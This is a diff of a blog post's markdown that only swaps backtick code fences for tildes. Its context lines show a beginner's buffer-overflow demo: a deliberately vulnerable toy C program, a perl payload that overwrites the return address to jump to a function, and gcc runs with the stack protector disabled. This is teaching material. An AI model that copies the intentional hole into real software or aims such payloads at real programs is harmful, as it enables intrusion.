@@ -18,7 +18,7 @@ work!
 
 Okay. Here is a program with a vulnerability, made extra easy to exploit:
 
-```c
+~~~
 #include <stdio.h>
 #include <string.h>
 
@@ -42,7 +42,7 @@ int main(int argc, char *argv[]) {
 
   return 0;
 }
-```
+~~~
 
 The idea is that we're going to put a string, then make the program jump to
 the address of `foo` instead of returning. I couldn't get this to work on my
@@ -51,7 +51,7 @@ worked. <s>If you know why please tell me!</s> <small>(*Edit:* Figured this out!
 just needed to pad the address with 0s until it was 64 bits and then
 experiment with offsets.)</small>
 
-```
+~~~
 $ gcc -m32 test.c -o test
 $ perl -e 'print "aaaa" . "\x64\x84\x04\x08" x 4' | ./test
 Here is the address of foo: 0x80484b4
@@ -63,11 +63,11 @@ What is your hacking text? You entered: aaaa���
 ./a.out[0x8048561]
 /lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xf75784d3]
 ./a.out[0x8048421]
-```
+~~~
 
 Oh look! It turns out that gcc already knows about this exploit and has special built-in protections! We can disable those, though...
 
-```
+~~~
 $ gcc -fno-stack-protector -m32 test.c -o test
 $ perl -e 'print "aaaa" . "\x64\x84\x04\x08" x 4' | ./test
 Here is the address of foo: 0x8048464
@@ -76,7 +76,7 @@ You hacked me! Here is the secret password: super_secret
 [1]    26357 done                              perl -e 'print "aaaa" . "\x64\x84\x04\x08" x 4' |
  
        26358 segmentation fault (core dumped)  ./a.out
-```
+~~~
 
 BOOM. We win!
 
